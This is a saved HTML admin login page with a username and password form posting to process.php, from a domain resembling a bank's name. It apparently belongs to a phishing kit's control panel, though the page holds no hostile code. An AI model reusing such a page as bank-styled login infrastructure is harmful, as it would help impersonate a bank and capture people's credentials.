
<!-- saved from url=(0044)http://uk.sambabk.com/e/admin3/adminarea.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Content-Language" content="en-us">

<title>Admin login</title>
<link rel="stylesheet" type="text/css" href="./login_files/BlobServer(1).css">
<link rel="stylesheet" type="text/css" href="./login_files/BlobServer.css">
<link rel="stylesheet" type="text/css" href="./login_files/BlobServer(2).css">
<link rel="stylesheet" type="text/css" href="./login_files/BlobServer(3).css">
<link rel="stylesheet" type="text/css" href="./login_files/BlobServer(4).css">
<link rel="stylesheet" type="text/css" href="./login_files/webmail.css">
<style type="text/css"></style></head>

<body>

<div align="center">
	&nbsp;<table border="1" width="80%" id="table1" height="439" cellspacing="0" bordercolor="#C0C0C0" cellpadding="0">
		<tbody><tr>
			<td>
			<table border="0" width="100%" id="table2" height="93" cellspacing="1">
				<tbody><tr>
					<td height="28">
					<table border="0" width="100%" id="table8" cellspacing="1">
						<tbody><tr>
							<td width="356" class="textSearchSmall">&nbsp;&nbsp;&nbsp;<span class="cpHeaderDate" id="today"><?php echo date("D F Y"); ?></span></td>
							<td class="textSearchSmall">
							<p align="right"><font size="2"><b>ADMIN LOGIN</b></font><b><font size="2"> AREA</font></b></p></td>
						</tr>
					</tbody></table>
					</td>
				</tr>
				<tr>
					<td bgcolor="#2F2573">
					<b><font size="2" color="#FFFFFF">FOR YOUR SECURITY, THIS 
					AREA IS PROTECTED.</font></b></td>
				</tr>
			</tbody></table>
			
			<table border="0" width="100%" id="table3" height="30" cellspacing="0">
				<tbody><tr>
					<td width="59" class="textMB" bgcolor="#2F2573">
					<p align="center">&nbsp;</p></td>
					<td bgcolor="#2F2573" class="textMB" width="139">
					<p align="center">&nbsp;</p></td>
					<td bgcolor="#2F2573" class="textMB" width="131">&nbsp;
					</td>
					<td bgcolor="#2F2573" class="textMB">&nbsp;
					</td>
					<td bgcolor="#2F2573" width="124" class="textMB">&nbsp;
					</td>
					<td bgcolor="#2F2573" width="190" class="textMB">
					<p align="center">&nbsp;</p></td>
				</tr>
			</tbody></table>
			<table border="0" width="100%" id="table4" height="292" cellspacing="0">
				<tbody><tr>
					<td width="156" bgcolor="#2F2573" class="textMenuBar" height="121">&nbsp;
					</td>
					
					<td rowspan="5">
					<table border="0" width="100%" id="table6" height="223" cellspacing="0">
						<tbody><tr>
							<td class="textMenuBar" bgcolor="#D3E9E7">	
				
																																	<table border="0" width="100%" id="table9" cellspacing="1">
																																		<tbody><tr>
																																			<td colspan="3" height="18" bgcolor="#2F2573">
																																			<font size="2" color="#FFFFFF"><b>Admin login area</b></font></td>
																																		</tr>
																																		<tr>
																																			<td colspan="3" height="167">
							
							<font size="2">&nbsp;</font><form method="POST" action="process.php">

			<table border="1" width="79%" id="table10" cellspacing="0" bordercolor="#2F2573">
				<tbody><tr>
					<td colspan="2" class="textMB" bgcolor="#2F2573" bordercolor="#2F2573">
					<p align="center"><font size="2" color="#FFFFFF">ADMIN LOGIN</font></p></td>
				</tr>
				<tr>
					<td class="textMB" width="38%" align="right" bordercolor="#D3E9E7">Username:</td>
					<td class="textMB" width="60%" bordercolor="#D3E9E7">
					<input type="text" name="username" size="20" required/></td>
				</tr>
				<tr>
					<td class="textMB" width="38%" align="right" bordercolor="#D3E9E7">Password:</td>
					<td class="textMB" width="60%" bordercolor="#D3E9E7">
					<input type="password" name="password" size="20" required/></td>
				</tr>
				<tr>
					<td class="textMB" width="38%" bordercolor="#D3E9E7">&nbsp;</td>
					<td class="textMB" width="60%" bordercolor="#D3E9E7">
					<input type="submit" value="Submit" name="B1"></td>
				</tr>
			</tbody></table>
			<font color="#FF0000" size="-1">You have entered wrong username or password</font>
		                    </form>
                      

																																			</td>
																																		</tr>
																																		<tr>
																																			<td width="72%">&nbsp;
																																			</td>
																																			<td width="9%" bgcolor="#D3E9E7">
																																			<p align="center">&nbsp;</p></td>
																																			<td width="18%">&nbsp;</td>
																																		</tr>
																																	</tbody></table>
							</td>
							<td width="18" bgcolor="#D3E9E7">&nbsp;
							</td>
						</tr>
					</tbody></table>
					<table border="0" width="100%" id="table7" height="88" cellspacing="0">
						<tbody><tr>
							<td class="textMB" bgcolor="#D3E9E7" height="86">
																										<p style="margin-top: -1px; margin-bottom: -1px"><font size="2">&nbsp;</font></p>
																										<p>&nbsp;</p></td>
						</tr>
					</tbody></table>
					</td>
				</tr>
				<tr>
					<td width="156" class="textHeaders" style="background-color: #2F2573">&nbsp;</td>
				</tr>
				<tr>
					<td width="156" class="textHeaders" style="background-color: #2F2573">&nbsp; 
					</td>
				</tr>
				<tr>
					<td width="156" class="textHeaders" style="background-color: #2F2573">&nbsp; 
					</td>
				</tr>
				<tr>
					<td width="156" class="textHeaders" height="17" style="background-color: #2F2573">&nbsp; 
					</td>
				</tr>
			</tbody></table>
			




</td></tr></tbody></table></div></body></html>